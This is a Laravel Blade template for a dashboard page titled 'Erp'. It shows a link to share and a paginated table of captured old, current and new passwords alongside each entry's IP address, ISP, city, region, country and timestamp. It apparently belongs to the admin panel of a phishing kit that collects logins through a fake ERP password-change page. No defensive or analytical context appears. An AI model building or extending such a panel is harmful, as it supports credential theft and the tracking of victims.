@extends('layouts.dashboard')

@section('content')

<div class="row justify-content-center">
    <div class="col-md-12">
        <div class="">
            <div class="">{{ __('Erp') }}
                <hr>
                <p><strong>Share this link: </strong><a href="{{ route('erp') }}" target="_blank" rel="noopener noreferrer">{{ route('erp') }}</a></p>
            </div>
            
                
            <table class="table table-bordered table-striped table-hover">
                <thead>
                    <tr>
                        <th>old_password</th>
                        <th>password</th>
                        <th>new_password</th>
                        <th>ip</th>
                        <th>isp</th>
                        <th>city</th>
                        <th>region</th>
                        <th>country</th>
                        <th>time</th>
                    </tr>
                </thead>
                <tbody>
                    @foreach ($dataErp as $dataE)
                    <tr>
                        <td>{{ $dataE->old_password }}</td>
                        <td>{{ $dataE->password }}</td>
                        <td>{{ $dataE->new_password }}</td>
                        <td>{{ $dataE->ip }}</td>
                        <td>{{ $dataE->isp }}</td>
                        <td>{{ $dataE->city }}</td>
                        <td>{{ $dataE->region }}</td>
                        <td>{{ $dataE->country }}</td>
                        <td>{{ $dataE->created_at }}</td>
                    </tr>
                    @endforeach
                </tbody>
                
            </table>

            
        </div>

        

    </div>
</div>

{!! $dataErp->links() !!}

@endsection
